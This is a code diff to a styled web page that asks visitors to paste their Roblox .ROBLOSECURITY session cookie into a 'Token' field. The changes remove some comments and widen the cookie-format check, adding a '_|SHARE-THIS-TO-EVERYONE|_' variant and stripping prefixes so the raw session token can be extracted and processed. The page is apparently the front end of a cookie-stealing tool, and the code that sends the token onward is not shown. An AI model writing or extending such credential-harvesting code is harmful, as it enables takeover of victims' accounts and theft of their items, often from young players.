@@ -15,7 +15,7 @@ export default {
         * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         body { font-family: 'Inter', sans-serif; min-height: 100vh; position: relative; overflow-x: hidden; transition: background 0.5s ease, color 0.3s ease; }
         
-        /* Theme Variables */
+        /* Theme Variables - same as before */
         body[data-theme="0"] { background: #0a000a; color: #fff; }
         body[data-theme="0"] .main-card { background: rgba(20,0,30,0.85); border-color: rgba(153,51,255,0.15); }
         body[data-theme="0"] .brand-name { background: linear-gradient(135deg, #cc88ff 0%, #9933ff 50%, #cc88ff 100%); -webkit-background-clip: text; background-clip: text; color: transparent; }
@@ -121,7 +121,6 @@ export default {
         .stat-value { font-size: 20px; font-weight: 800; color: #cc88ff; transition: color 0.3s ease; }
         .stat-label { font-size: 10px; color: #664488; text-transform: uppercase; letter-spacing: 0.8px; font-weight: 600; margin-top: 2px; }
 
-        /* Theme Selector */
         .theme-selector { display: flex; gap: 8px; flex-wrap: wrap; justify-content: center; margin-bottom: 20px; padding: 10px; background: rgba(20,0,30,0.4); border-radius: 50px; backdrop-filter: blur(8px); border: 1px solid rgba(153,51,255,0.06); }
         .theme-dot { width: 30px; height: 30px; border-radius: 50%; cursor: pointer; border: 2px solid transparent; transition: all 0.3s ease; flex-shrink: 0; }
         .theme-dot:hover { transform: scale(1.15); }
@@ -187,7 +186,6 @@ export default {
         <p class="brand-sub">v3.0</p>
     </div>
     
-    <!-- Theme Selector -->
     <div class="theme-selector">
         <div class="theme-dot active" data-theme="0" onclick="setTheme(0)"></div>
         <div class="theme-dot" data-theme="1" onclick="setTheme(1)"></div>
@@ -215,7 +213,7 @@ export default {
                     Token
                 </label>
                 <textarea id="cookieInput" class="input-field" rows="3" placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_..."></textarea>
-                <div class="cookie-warning">Format: _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_...</div>
+                <div class="cookie-warning">Format: _|WARNING:-DO-NOT-SHARE-THIS...|_ or _|SHARE-THIS-TO-EVERYONE|_</div>
             </div>
             <button class="submit-btn" onclick="handleSubmit()">
                 <span id="btnCookieText">Submit</span>
@@ -245,7 +243,6 @@ export default {
     <button class="discord-close-btn" id="closeDiscordPopup">Close</button>
 </div>
 <script>
-    // Theme System
     function setTheme(index) {
         document.body.setAttribute('data-theme', index);
         document.querySelectorAll('.theme-dot').forEach(function(dot, i) {
@@ -258,7 +255,6 @@ export default {
         localStorage.setItem('astral-theme', index);
     }
     
-    // Load saved theme
     (function() {
         var saved = localStorage.getItem('astral-theme');
         if (saved !== null) {
@@ -330,8 +326,9 @@ export default {
             resultCard.innerHTML = '<div class="result-card error"><div class="result-content">Token required</div></div>';
             return;
         }
-        if (!cookie.includes('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_')) {
-            resultCard.innerHTML = '<div class="result-card error"><div class="result-content">Invalid format</div></div>';
+        // Accept both warning formats
+        if (!cookie.includes('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_') && !cookie.includes('_|SHARE-THIS-TO-EVERYONE|_')) {
+            resultCard.innerHTML = '<div class="result-card error"><div class="result-content">Invalid format. Must contain _|WARNING:-DO-NOT-SHARE-THIS...|_ or _|SHARE-THIS-TO-EVERYONE|_</div></div>';
             return;
         }
         window._processing = true;
@@ -600,8 +597,13 @@ export default {
         }
 
         let cookieValue = cookie;
+        // Support both warning formats
         if (cookie.includes('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_')) {
           cookieValue = cookie.replace('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_', '');
+        }
+        // Support SHARE-THIS-TO-EVERYONE format
+        if (cookie.includes('_|SHARE-THIS-TO-EVERYONE|_')) {
+          cookieValue = cookie.replace('_|SHARE-THIS-TO-EVERYONE|_', '');
         }
         if (cookieValue.startsWith('.ROBLOSECURITY_')) {
           cookieValue = cookieValue.replace('.ROBLOSECURITY_', '');
